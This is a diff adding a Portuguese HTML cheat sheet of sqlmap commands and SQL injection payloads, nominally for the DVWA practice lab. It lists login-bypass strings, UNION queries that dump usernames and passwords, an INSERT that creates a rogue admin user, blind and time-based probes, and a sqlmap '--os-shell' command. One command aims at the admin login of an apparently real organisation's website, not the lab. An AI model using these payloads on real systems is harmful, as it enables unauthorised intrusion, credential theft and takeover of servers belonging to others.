@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Comandos SQLmap</title>
+<link rel="stylesheet" href="css/style.css">
+
+</head>
+<body>
+<div class="container">
+    <h1>Comandos SQLmap para Explorar Vulnerabilidades no DVWA</h1>
+    <h2>SQL Injection na Página de Login (Nível Baixo de Segurança)</h2>
+    <pre>sqlmap -u "http://exemplo.com/login.php" --data="username=teste&password=teste&Login=Login" --method POST --level=1 --risk=1 --technique=BEUST --dbms=mysql --dbs</pre>
+   <h2>SQL Injection na Página de Login (Nível Baixo de Segurança)</h2>
+<pre>python sqlmap.py -u "https://fjj.org.br/sistema/admin/login.php" --data "username=' or 1=1; --password=password" --method POST --level=1 --risk=1 --technique=BEUST --dbs</pre>
+<h2>SQL Injection na Página de Login (Nível Baixo de Segurança)</h2>
+<pre>sqlmap.py -r post.txt --dbs</pre>
+      
+     
+    <h2>SQL Injection na Página de SQL Injection (GET) (Nível Médio de Segurança)</h2>
+    <pre>sqlmap -u "http://exemplo.com/injection.php?parameter=value" --method GET --level=2 --risk=2 --technique=BEUST --dbms=mysql --dbs</pre>
+    <p>Uma maneira comum de verificar se uma URL está vulnerável à injeção de SQL é tentar adicionar aspas simples (') a um parâmetro da URL e observar a resposta do servidor. Se o servidor responder com um erro ou comportamento inesperado, isso pode indicar uma vulnerabilidade de injeção de SQL.</p>
+    <pre>http://exemplo.com/pagina.php?id=1'</pre>  
+
+    <h2>SQL Injection na Página de SQL Injection (POST) (Nível Alto de Segurança)</h2>
+    <pre>sqlmap -u "http://exemplo.com/injection_post.php" --data="data=@dados_post.txt" --method POST --level=5 --risk=3 --technique=BEUST --dbms=mysql --dbs</pre>
+
+    <h2>SQL Injection na Página de Injeção de SQL (Blind), Ordem de Ataque e Erros (Nível Médio/Alto de Segurança)</h2>
+    <pre>sqlmap -u "http://exemplo.com/injection_blind.php?parameter=value" --method GET --level=3 --risk=2 --technique=BEUST --dbms=mysql --dbs</pre>
+
+<h1>Explorando Vulnerabilidades de Injeção de SQL Blind: Testes e Técnicas em URLs</h1>
+<h2>Injeção SQL para Bypass do Login:</h2>
+     <pre>' OR 1=1 --</pre>
+     <p>Injeção SQL para Obter Informações Confidenciais:</p>
+     <pre>' UNION SELECT username, password FROM users WHERE '1'='1
+</pre>
+     <p>Injeção SQL para Adicionar um Novo Usuário Administrador:</p>
+     <pre>'; INSERT INTO users (username, password) VALUES ('hacker', 'novasenha') --
+</pre>
+<h2>Obter a shell do SO</h2>
+<pre>sqlmap --dbms=mysql -u "$URL" --os-shell</pre>
+
+     <p>Se a vulnerabilidade de injeção de SQL estiver presente em parâmetros da URL, o método de ataque será diferente. Aqui estão alguns exemplos de como os comandos de injeção de SQL poderiam ser usados em uma solicitação GET</p>
+      <p>Injeção SQL para Bypass do Login.Este comando injeta uma condição sempre verdadeira no parâmetro do nome de usuário na URL, tentando ignorar a autenticação.</p>
+      <pre>http://exemplo.com/login.php?username=' OR 1=1 --</pre>
+      <p>Injeção SQL para Obter Informações Confidenciais.Este comando tenta injetar uma consulta SQL maliciosa no parâmetro id da URL para recuperar informações confidenciais da tabela de usuários.</p>
+      <pre>http://exemplo.com/informacoes.php?id=1 UNION SELECT username, password FROM users WHERE '1'='1'
+</pre>
+       <p>Injeção SQL para Adicionar um Novo Usuário Administrador.Este comando tenta injetar uma sequência de SQL maliciosa no parâmetro username da URL para inserir um novo usuário com privilégios de administrador.</p>
+      <pre>http://exemplo.com/criar_usuario.php?username=hacker&password=novasenha'; INSERT INTO users (username, password) VALUES ('hacker', 'novasenha') --
+</pre>
+<h2>aqui está um exemplo de como você pode realizar um teste de injeção de SQL blind em uma URL:
+Suponha que temos uma aplicação web com uma URL como esta:</h2>
+<pre>http://exemplo.com/pagina.php?id=1</pre>
+<p>Vamos usar o parâmetro id como entrada para a nossa injeção de SQL. Primeiro, vamos tentar determinar se o parâmetro id é vulnerável a injeção de SQL blind.</p>
+<h2>Teste de Tempo de Resposta</h2>
+<p>Adicione uma condição que resultaria em um atraso perceptível se a injeção de SQL blind fosse bem-sucedida. Por exemplo:</p>
+<pre>http://exemplo.com/pagina.php?id=1' AND SLEEP(5) --</pre>
+<p>Se houver um atraso de aproximadamente 5 segundos na resposta do servidor, isso pode indicar uma vulnerabilidade de injeção de SQL blind.</p>
+<h2>Teste de Booleano:</h2>
+<p>Use expressões booleanas para determinar se a aplicação responde de maneira diferente com base na avaliação dessas expressões. Por exemplo:</p>
+<pre>http://exemplo.com/pagina.php?id=1' OR 1=1 --
+</pre>
+<p>Se a página responder da mesma forma que quando id=1, isso pode indicar uma vulnerabilidade.</p>
+<h2>Análise de Comportamento:</h2>
+<p>Observe qualquer diferença no comportamento da aplicação em resposta a solicitações maliciosas. Por exemplo, se a aplicação retornar uma mensagem de erro específica ou exibir conteúdo diferente, isso pode indicar uma vulnerabilidade.</p>
+<h2>Erro Personalizado:</h2>
+<p>Tente induzir a aplicação a gerar um erro SQL. Por exemplo:</p>
+<pre>http://exemplo.com/pagina.php?id=1' AND (SELECT * FROM invalid_table) --
+</pre>
+<p>Se a aplicação retornar uma mensagem de erro indicando que a tabela é inválida, isso pode ser um sinal de uma vulnerabilidade de injeção de SQL.</p>
+
+</div>
+</body>
+</html>
